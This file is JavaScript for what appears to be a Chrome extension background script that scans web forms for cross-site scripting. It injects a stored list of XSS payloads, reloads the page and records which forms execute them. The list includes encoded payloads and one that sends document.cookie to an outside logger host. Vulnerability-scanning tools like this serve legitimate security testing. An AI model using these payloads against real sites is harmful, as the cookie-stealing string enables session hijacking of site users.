function isEmpty(obj) {
    for (var key in obj) {
        if(obj.hasOwnProperty(key)) {
            return false;
        }
    }
    return true;
}

function getActiveItems(items) {
    return items.filter(function(item) {
        return item.active;
    })
}

function sendMessage(message) {
    chrTabs.query(
        {windowId: -2, active: true},
        function (tabs) {
            var port = chrTabs.connect(tabs[0].id);
            port.postMessage(message);
        }
    )
}

function createFormsList(formsStrings) {
    formsList = formsStrings.map(function(formString) {
        return {
            formString: formString,
            status: formStatuses.WAITING,
            reports: []
        }
    });
    formsList[0].status = formStatuses.INPROGRESS;
}

function getFormStatus(formIndex) {
    var isVulnerable = formsList[formIndex].reports.some(function(report) {
        return report.vulnerable;
    });
    return isVulnerable ? 'vulnerable' : 'safe';
}

function logReport() {
    var result = {};
    console.log('in log report');
    formsList.forEach(function(formData, index) {
        var form = result[formData.formString + index] = {};
        formData.reports.forEach(function(report) {
            form[report.xssString] = report.vulnerable;
        });
    });

    console.log( formsList, result);
    console.table(result);
}

function fillFormWithXSS(formIndex, xssIndex) {
    xssInProgress = true;

    sendMessage({
        sender: 'background',
        recipient: 'content-script',
        action: 'fillForm',
        data: {
            formIndex: formIndex,
            xssIndex: xssIndex,
            xssArray: xssArray
        }
    });

    checkVulTimeout = setTimeout(function() {
        sendMessage({
            sender: 'background',
            recipient: 'content-script',
            action: 'checkVulnerability',
            data: {
                formIndex: formIndex,
                xssIndex: xssIndex,
                xssArray: xssArray
            }
        });
    }, 3000);
}

function cancelScan() {
    formsCount = 0;
    formsList = [];
    formCounter = 0;
    xssCounter = 0;
    testingUrl = '';
    finish = 0;
    xssInProgress = false;
    clearTimeout(checkVulTimeout);
}

function messageHandler(message) {
    console.log(message);
    console.log('in message handler', formCounter, finish);
    //if (message.recipient === 'content-script') {
    //    if (message.action === 'scanPage') {
    //        cancelScan();
    //    }
    //    sendMessage(message);
    //}

    if (message.recipient === 'background') {

        switch (message.action) {
            case 'saveForms':
                createFormsList(message.data.formsStrings);
                formsCount = message.data.formsCount;
                testingUrl = message.data.pageUrl;
                finish = formsCount;
                fillFormWithXSS(formCounter, xssCounter);
                break;

            case 'xssReport':
                formsList[formCounter].reports.push(message.data.report);
                xssCounter++;
                xssInProgress = false;
                sendMessage({
                    sender: 'background',
                    recipient: 'content-script',
                    action: 'refreshPage',
                    data: {
                        pageUrl: testingUrl
                    }
                });
                break;

            case 'lastXssReport':
                console.log('in last xss report', formCounter, finish);
                formsList[formCounter].reports.push(message.data.report);
                formsList[formCounter].status = getFormStatus(formCounter);
                formCounter++;
                xssCounter = 0;
                xssInProgress = false;
                if (formCounter !== finish) {
                    sendMessage({
                        sender: 'background',
                        recipient: 'content-script',
                        action: 'refreshPage',
                        data: {
                            pageUrl: testingUrl
                        }
                    });
                } else {
                    logReport();
                    formCounter = 0;
                    formsList = [];
                }
                break;

            case 'pageLoaded':
                console.log('in page loaded', formCounter, xssCounter, finish);
                if ((formCounter !== 0 || xssCounter !== 0) && !xssInProgress) {
                    formsList[formCounter].status = formStatuses.INPROGRESS;
                    fillFormWithXSS(formCounter, xssCounter);
                }
                break;

            case 'cancelScan':
                cancelScan();
                break;
        }

    }
}


var chrTabs = chrome.tabs;
var chrRuntime = chrome.runtime;
var chrStorage = chrome.storage;

var formStatuses = {
    INPROGRESS: 'inprogress',
    WAITING: 'waiting',
    VULNERABLE: 'vulnerable',
    SAFE: 'safe'
};

var port = chrRuntime.connect();
var formsCount;
var formsList = [];
var formCounter = 0;
var xssCounter = 0;
var testingUrl;
var finish;
var checkVulTimeout;
var xssInProgress=false;

var xssArray;

var xssFile = chrome.extension.getURL('js/xss/xss.js');

chrStorage.local.get('xssArray', function(items) {


    if (isEmpty(items)) {
        chrStorage.local.set({'xssArray': [
            {
                xssString: '<img src="empty.gif" onerror="location.hash=\'EVIL\';console.error(\'YOU ARE HACKED\');" />',
                result: 'location.hash === "#EVIL"',
                active: true
            },
            {
                xssString: '"><img src="empty.gif" onerror="location.hash=\'EVIL\';console.error(\'YOU ARE HACKED\');" />',
                result: 'location.hash === "#EVIL"',
                active: true
            },
            {
                xssString: '\');location.hash=\'EVIL\';',
                result: 'location.hash === "#EVIL"',
                active: true
            },
            {
                xssString: 'ZZZ <script>location.hash=\'EVIL\';console.error(\'YOU ARE HACKED\');</script>',
                result: 'location.hash === "#EVIL"',
                active: false
            },
            {
                xssString: '<SCRIPT SRC='+xssFile+'></SCRIPT>',
                result: 'location.hash === "#666"',
                active: false
            },
            {
                xssString: '<SCRIPT/XSS SRC="'+xssFile+'"></SCRIPT>',
                result: 'location.hash === "#666"',
                active: false
            },
            {
                xssString: '<img src="empty.gif" onerror="var evilImg=new Image(); evilImg.src=\'http://logger.com/?c=\'+' +
                'encodeURI(document.cookie); document.body.appendChild(evilImg); evilImg.classList.add(\'evil-image\'); console.error(\'YOU ARE HACKED\',evilImg);" />',
                result: 'document.querySelector(".evil-image")',
                active: false
            },
            {
                xssString: '<img src=javascript:void(location.hash=\'#EVIL\')>',
                result: 'location.hash === "#EVIL"',
                active: false
            },
            {
                xssString: '<img """><script>location.hash=\'EVIL\';</script>">',
                result: 'location.hash === "#EVIL"',
                active: false
            },
            {
                xssString: '<IMG STYLE="xss:expr/*XSS*/ession(location.hash=666)">',
                result: 'location.hash === "#666"',
                active: false
            },
            {
                xssString: 'url('+xssFile+')',
                result: 'location.hash === "#666"',
                active: false
            },
            {
                xssString: '<img src=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x76;&#x6F;&#x69;&#x64;&#x28;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x68;&#x61;&#x73;&#x68;&#x3D;&#x27;&#x23;&#x45;&#x56;&#x49;&#x4C;&#x27;&#x29;>',
                result: 'location.hash === "#EVIL"',
                active: false
            },

            {
                xssString: '<img src=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#118&#111&#105&#100&#40&#108&#111&#99&#97&#116&#105&#111&#110&#46&#104&#97&#115&#104&#61&#39&#35&#69&#86&#73&#76&#39&#41>',
                result: 'location.hash === "#EVIL"',
                active: false
            },
            {
                xssString: '<img src=%6A%61%76%61%73%63%72%69%70%74%3A%76%6F%69%64%28%6C%6F%63%61%74%69%6F%6E%2E%68%61%73%68%3D%27%23%45%56%49%4C%27%29>',
                result: 'location.hash === "#EVIL"',
                active: false
            }
        ]
        }, function(){})
    } else {
        xssArray = getActiveItems(items.xssArray);
        console.log(xssArray);
    }
});

chrStorage.onChanged.addListener(function(changes) {
    xssArray = getActiveItems(changes.xssArray.newValue);
    console.log(xssArray);
});

chrRuntime.onConnect.addListener(function (port) {
    port.onMessage.addListener(messageHandler);
});
